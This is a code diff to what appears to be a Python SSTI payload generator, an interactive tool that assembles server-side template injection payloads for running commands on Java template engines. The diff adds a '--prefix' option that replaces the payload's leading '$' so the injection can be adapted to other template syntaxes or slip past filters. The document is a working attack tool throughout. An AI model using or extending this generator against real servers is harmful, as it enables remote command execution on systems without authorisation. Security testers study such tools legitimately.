@@ -4,9 +4,11 @@ import urllib.parse, argparse
 
 parser = argparse.ArgumentParser(description="Generate SSTI payloads... One character at a time.")
 parser.add_argument("-u","--url-encode", action="store_true", help="URL Encode")
+parser.add_argument("-p","--prefix", type=ascii, help="Modify Payload Prefix")
 args = parser.parse_args()
 
 url_encode=args.url_encode
+modify_prefix=args.prefix
 
 class Terminal(Cmd):
 	prompt='\033[1;33mCommand ==>\033[0m '
@@ -26,6 +28,8 @@ class Terminal(Cmd):
 			payload+=line
 
 		payload+=').getInputStream())}'
+		if modify_prefix:
+			payload = payload.replace("$", modify_prefix[1:-1], 1)	
 		if url_encode:
 			payload_encoded=urllib.parse.quote_plus(payload,safe='')
 			return payload_encoded
